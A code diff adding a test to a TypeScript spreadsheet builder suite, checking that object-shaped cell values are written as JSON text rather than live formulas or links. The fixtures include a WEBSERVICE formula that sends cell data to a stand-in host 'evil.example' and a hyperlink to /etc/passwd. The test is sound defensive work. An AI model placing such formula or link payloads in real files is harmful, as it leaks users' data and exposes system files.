@@ -109,4 +109,36 @@ describe("SpreadsheetBuilder", () => {
       expect(ws.getCell(`A${index + 2}`).value).toBe(code);
     });
   });
+
+  it("writes object and array cells as JSON text, not as ExcelJS formulas or links", async () => {
+    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "cowork-spreadsheet-"));
+    const workspace: Workspace = {
+      id: "test-workspace",
+      name: "test-workspace",
+      path: tmpDir,
+      createdAt: Date.now(),
+      permissions: { read: true, write: true, delete: true, network: true, shell: false },
+    };
+    const outPath = path.join(tmpDir, "objects.xlsx");
+    // Shapes ExcelJS would otherwise write as a formula, hyperlink, rich text or error cell.
+    const objectCells = [
+      { formula: 'WEBSERVICE("https://evil.example/?"&A1)' },
+      { text: "Invoice", hyperlink: "file:///etc/passwd" },
+      { richText: [{ text: "rich" }] },
+      { error: "#N/A" },
+      ["nested", 1],
+    ];
+
+    await new SpreadsheetBuilder(workspace).create(outPath, [
+      { name: "Cells", data: [[{ formula: "1+1" }], ...objectCells.map((cell) => [cell])] },
+    ]);
+
+    const wb = new ExcelJS.Workbook();
+    await wb.xlsx.readFile(outPath);
+    const ws = wb.getWorksheet("Cells")!;
+    expect(ws.getCell("A1").value).toBe('{"formula":"1+1"}');
+    objectCells.forEach((cell, index) => {
+      expect(ws.getCell(`A${index + 2}`).value).toBe(JSON.stringify(cell));
+    });
+  });
 });
